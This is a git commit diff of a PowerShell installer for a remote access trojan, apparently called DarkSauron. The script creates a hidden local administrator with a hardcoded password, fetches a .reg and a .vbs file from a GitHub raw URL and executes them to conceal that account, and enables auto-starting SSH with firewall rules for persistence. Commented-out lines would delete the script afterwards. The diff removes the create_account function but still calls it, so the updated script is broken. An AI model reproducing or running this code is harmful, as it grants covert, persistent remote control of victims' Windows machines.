bb461d033da885fce17e93eb6abe3391278187ed
knightcoder77 <langehmanik@gmail.com>
2026-01-11 00:05:33 +0530

    updated one

--- files/installer.ps1
+++ files/installer.ps1
@@ -10,88 +10,38 @@
 
 
 
-
-
-#create local admin for the rat 
-function create_account {
-    [CmdletBinding()] 
-    param (
-        [string] $uname,
-        [securestring] $password
-     )
-     begin {
-     }
-        process {
-            New-LocalUser "$uname" -password $password -FullName "$uname" -Description "Temporary local admin"
-            Write-Verbose "$uname local user crated" 
-            Add-LocalGroupMember -Group "Administrators" -Member "$uname"
-            
-        }
-        end{  
-        }
-
-    }
-
-#create admin user
+# 1. Define variables FIRST
 $uname = random_text
 $password = (ConvertTo-SecureString "Rat@@123"-AsPlainText -Force)
-create_account  -uname $uname -password $password
-
-
-
-#goto temp ,make working directory
-
- mkdir $path 
- cd $path 
- 
-
-
-
-#registry  to hide local admin
-$reg_file = random_text
-Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/admin.reg -OutFile "$reg_file.reg"
-
-
-
-
-#visual basic script to registry
-$vbs_file = random_text
-Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
-
-#install the registry
-./"$reg_file.reg";"$vbs_file.vbs"
-
-
-
-
-
-#varaibles
-
 $wd = random_text
-$path = "$env:temp/$wd"
+$path = "$env:temp/$wd"  # Define BEFORE using it!
 $initial_dir = Get-Location
- 
 
+# 2. Create admin user
+create_account -uname $uname -password $password
 
+# 3. Create working directory
+mkdir $path 
+cd $path 
 
+# 4. Download files to current directory
+$reg_file = random_text
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/admin.reg" -OutFile "$reg_file.reg"
 
+$vbs_file = random_text
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs" -OutFile "$vbs_file.vbs"
 
+# 5. Execute files properly
+Start-Process "reg.exe" -ArgumentList "import `"$reg_file.reg`""
+Start-Process "wscript.exe" -ArgumentList "`"$vbs_file.vbs`""
 
-
-
-
-#enabling  the presistance ssh 
+# 6. Enable SSH (fix firewall command)
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 
 Start-Service sshd 
-Set-Service  -Name sshd -StartupType 'Automatic' 
-Get-NetFirewallRule -Name *ssh* -Enabled True
+Set-Service -Name sshd -StartupType 'Automatic' 
+Get-NetFirewallRule -Name *ssh* | Set-NetFirewallRule -Enabled True
 
-
-
- #self delete
- #cd $initial_dir
- #del installer.ps1
-
-
- 
+# 7. Optional: Self delete
+# cd $initial_dir
+# del installer.ps1
 
